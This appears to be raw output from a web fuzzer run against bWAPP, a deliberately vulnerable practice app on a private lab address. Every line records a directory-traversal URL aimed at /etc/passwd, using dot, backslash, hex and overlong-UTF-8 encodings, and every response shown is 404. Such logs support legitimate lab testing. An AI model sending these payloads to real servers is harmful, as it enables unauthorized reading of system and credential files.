503,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../..//etc/passwd
514,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../..//etc/passwd
515,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../..//etc/passwd
517,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../..//etc/passwd
501,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../..//etc/passwd
500,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../..//etc/passwd
502,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../..//etc/passwd
512,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
518,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../..//etc/passwd
516,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../..//etc/passwd
513,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../..//etc/passwd
519,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../..//etc/passwd
528,404,9L,39W,http://192.168.1.86/bWAPP/...//etc/passwd
498,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../..//etc/passwd
480,404,9L,39W,http://192.168.1.86/bWAPP/\..//etc/passwd
529,404,9L,39W,http://192.168.1.86/bWAPP/.../...//etc/passwd
539,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\/etc/passwd
540,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\/etc/passwd
542,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\/etc/passwd
541,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\/etc/passwd
535,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../.../...//etc/passwd
533,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../...//etc/passwd
534,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../...//etc/passwd
543,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\...\/etc/passwd
550,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../....//etc/passwd
549,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../....//etc/passwd
536,404,9L,39W,http://192.168.1.86/bWAPP/...\/etc/passwd
537,404,9L,39W,http://192.168.1.86/bWAPP/...\...\/etc/passwd
532,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../...//etc/passwd
553,404,9L,39W,http://192.168.1.86/bWAPP/....\....\/etc/passwd
552,404,9L,39W,http://192.168.1.86/bWAPP/....\/etc/passwd
538,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\/etc/passwd
546,404,9L,39W,http://192.168.1.86/bWAPP/..../..../....//etc/passwd
545,404,9L,39W,http://192.168.1.86/bWAPP/..../....//etc/passwd
544,404,9L,39W,http://192.168.1.86/bWAPP/....//etc/passwd
548,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../....//etc/passwd
547,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../....//etc/passwd
555,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\/etc/passwd
530,404,9L,39W,http://192.168.1.86/bWAPP/.../.../...//etc/passwd
531,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../...//etc/passwd
559,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\....\/etc/passwd
558,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\/etc/passwd
554,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\/etc/passwd
564,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../../..//etc/passwd
561,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../..//etc/passwd
562,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../..//etc/passwd
571,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\/etc/passwd
569,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\/etc/passwd
566,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../../../../..//etc/passwd
570,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\/etc/passwd
575,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\..\/etc/passwd
572,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\/etc/passwd
574,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\/etc/passwd
565,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../../../..//etc/passwd
573,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\/etc/passwd
563,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../..//etc/passwd
560,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................//etc/passwd
567,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../../../../../..//etc/passwd
645,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
644,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
643,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f/etc/passwd
640,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f/etc/passwd
642,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f/etc/passwd
641,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f/etc/passwd
568,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\/etc/passwd
653,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
650,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
652,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
651,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
649,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e//etc/passwd
648,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e//etc/passwd
647,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
646,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
657,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
656,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f/etc/passwd
667,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c/etc/passwd
668,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
659,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
660,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
661,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
669,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
664,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c/etc/passwd
671,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
672,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\/etc/passwd
670,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
658,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
673,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\/etc/passwd
675,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
666,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c/etc/passwd
663,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
676,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
677,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
678,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
662,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
683,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
682,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
681,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
679,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
655,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
684,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
685,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
686,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
654,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
688,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f/etc/passwd
687,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
690,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f/etc/passwd
691,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
692,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
694,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
695,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
674,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
665,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c/etc/passwd
696,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e//etc/passwd
697,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
693,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
556,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\/etc/passwd
680,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c/etc/passwd
551,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../..../....//etc/passwd
700,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
